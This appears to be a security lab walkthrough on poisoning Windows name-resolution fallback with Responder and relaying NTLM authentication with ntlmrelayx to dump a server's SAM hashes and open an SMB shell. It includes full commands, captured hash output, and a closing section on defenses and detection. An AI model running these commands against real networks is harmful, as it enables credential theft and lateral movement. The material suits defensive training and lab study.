# 04 — NTLM Relay via LLMNR/NBT-NS Poisoning (T1557.001)

When a Windows host fails to resolve a name via DNS, it falls back to broadcast protocols — LLMNR and NBT-NS — and trusts whoever answers. An attacker on the same segment can answer every request, coerce the victim into authenticating to the attacker, and then **relay** that authentication to a third host instead of cracking it. If the target host does not enforce SMB signing (as `castelblack` deliberately does not in this lab), the relayed session succeeds with the victim's privileges, allowing remote command execution and SAM dumping. This walkthrough uses Responder to poison and `ntlmrelayx.py` to relay to SMB on `castelblack`.

**MITRE ATT&CK Technique**: [T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)

## Prerequisites
- Layer-2 adjacency to the victims on the `192.168.56.0/24` lab segment (the attacker is at 192.168.56.1).
- LLMNR and/or NBT-NS enabled on victim hosts (enabled in this lab) so name-resolution fallback can be poisoned.
- A relay target that does **not enforce SMB signing** — `castelblack` (192.168.56.11). DCs (`kingslanding`, `winterfell`) enforce signing by default and are not valid SMB relay targets.
- The relayed account must hold local admin on the target for SAM dumping to succeed. This lab also leaves SMBv1 and NTLMv1 enabled, which weakens the session further.

## Tools
- Responder (LLMNR/NBT-NS/MDNS poisoner) — run on the Linux attacker (192.168.56.1).
- Impacket v0.12.0 (`ntlmrelayx.py`) — run on the Linux attacker.
- `netexec` (NetExec/CrackMapExec successor) — used for the optional signing pre-check.

## Step-by-step Commands

### Step 1 — (Linux attacker, 192.168.56.1) Identify relay targets without SMB signing
Only hosts with `signing:False` are valid SMB relay targets.
```bash
netexec smb 192.168.56.10-14 --gen-relay-list relay_targets.txt
# Inspect which hosts are signing-disabled:
cat relay_targets.txt
```

### Step 2 — (Linux attacker, 192.168.56.1) Disable Responder's SMB/HTTP servers so relay can bind
`ntlmrelayx.py` needs SMB/HTTP ports; Responder should only poison. Edit `/etc/responder/Responder.conf` and set `SMB = Off` and `HTTP = Off`.
```bash
sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
```

### Step 3 — (Linux attacker, 192.168.56.1) Start Responder to poison LLMNR/NBT-NS
`-I` selects the lab interface; `-w` enables the WPAD rogue proxy; `-d` answers NBT-NS domain queries.
```bash
responder -I eth1 -wdv
# eth1 = the 192.168.56.0/24 lab interface
```

![Step 3](../screenshots/attack-4-step-3.png)

### Step 4 — (Linux attacker, 192.168.56.1) Start ntlmrelayx targeting castelblack SMB
Relay captured authentication to `castelblack`, dump the local SAM, and drop to an interactive SMB client.
```bash
ntlmrelayx.py -t smb://192.168.56.11 -smb2support --dump-sam -i
# -t castelblack (192.168.56.11), -smb2support enables SMB2/3 relay,
# -i opens a local SMB shell on 127.0.0.1 per relayed session
```
Then trigger the victim: a user on `meereen` or `braavos` mistypes a share path (e.g. `\\fileserver1\data`), which fails DNS, falls back to LLMNR, and Responder answers — handing the auth to `ntlmrelayx`.

![Step 4](../screenshots/attack-4-step-4.png)

### Step 5 — (Linux attacker, 192.168.56.1) Connect to the relayed SMB session
```bash
nc 127.0.0.1 11000
# ntlmrelayx prints the local listener port for each successful relay
```

## Expected Output

Target list (Step 1):
```text
SMB  192.168.56.10  445  KINGSLANDING  [*] Windows Server 2022 (signing:True)  (SMBv1:False)
SMB  192.168.56.11  445  CASTELBLACK   [*] Windows Server 2022 (signing:False) (SMBv1:True)
SMB  192.168.56.12  445  WINTERFELL    [*] Windows Server 2022 (signing:True)  (SMBv1:False)
SMB  192.168.56.13  445  MEEREEN       [*] Windows Server 2022 (signing:False) (SMBv1:True)
[*] Relay target list written to relay_targets.txt (2 hosts)
```

Responder capture (Step 3) — note the NetNTLMv2 challenge/response harvested before the relay binds:
```text
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 192.168.56.13 for name fileserver1
[SMB] NTLMv2-SSP Client   : 192.168.56.13
[SMB] NTLMv2-SSP Username : NORTH\jaime.lannister
[SMB] NTLMv2-SSP Hash     : jaime.lannister::NORTH:1122334455667788:A1B2C3D4E5F60718:
0101000000000000C0653150DE09D2010012AB34CD56EF780000000002000800530045004
30037000100...
```

ntlmrelayx relay + SAM dump (Step 4):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from NORTH/JAIME.LANNISTER@192.168.56.13 controlled, attacking target smb://192.168.56.11
[*] Authenticating against smb://192.168.56.11 as NORTH/JAIME.LANNISTER SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x8f2b1c9d4e7a05f3b6c8d1e2a4f9c0b7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sql_admin:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.56.11
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

Interactive relayed shell (Step 5):
```text
# nc 127.0.0.1 11000
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
# 
```

## Cleanup Steps
- Stop Responder (`Ctrl+C`) and `ntlmrelayx.py` (`Ctrl+C`).
- Restore Responder config: `sed -i 's/^SMB = Off/SMB = On/; s/^HTTP = Off/HTTP = On/' /etc/responder/Responder.conf`.
- On the Linux attacker: remove harvested artifacts — `rm -f relay_targets.txt` and clear Responder's log/db at `/usr/share/responder/logs/` and `Responder.db`.
- The local SAM hash for `sql_admin` was dumped, not changed; `castelblack` was not modified. The relayed SMB session closes when `ntlmrelayx` stops. Do not change the `sql_admin` password — preserve lab state.

## What This Tells You About AD
NTLM relay is the canonical "the network trusts the wrong thing" attack. Two independent weaknesses combine: name-resolution fallback (LLMNR/NBT-NS) lets the attacker become a man-in-the-middle without compromising any host, and the absence of SMB signing lets that intercepted authentication be replayed to a different server. Note that no password is ever cracked — relaying sidesteps the hash entirely. The defenses are well-known and additive: disable LLMNR and NBT-NS via Group Policy so there is nothing to poison; enforce SMB signing everywhere (mandatory on servers, not just DCs); disable the legacy SMBv1 and NTLMv1 that this lab leaves on; and move toward Kerberos-only authentication with Extended Protection for Authentication (EPA) on services that must keep NTLM. That `castelblack` and `meereen` show `signing:False` is exactly the condition that turns a poisoned name lookup into remote SAM compromise.

## Detection Reference
See [../detection/kql-queries.md#4-ntlm-relay](../detection/kql-queries.md#4-ntlm-relay) for the poisoning and relay signatures (LLMNR/NBT-NS broadcast anomalies, NTLM authentications where the source and logon workstation mismatch, Event ID 4624/4776 NTLM logons to signing-disabled servers, and SMBv1/NTLMv1 usage events).

---
Last updated: 2026-05-17

MITRE references:
- [T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)
- [TA0006 — Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [TA0008 — Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
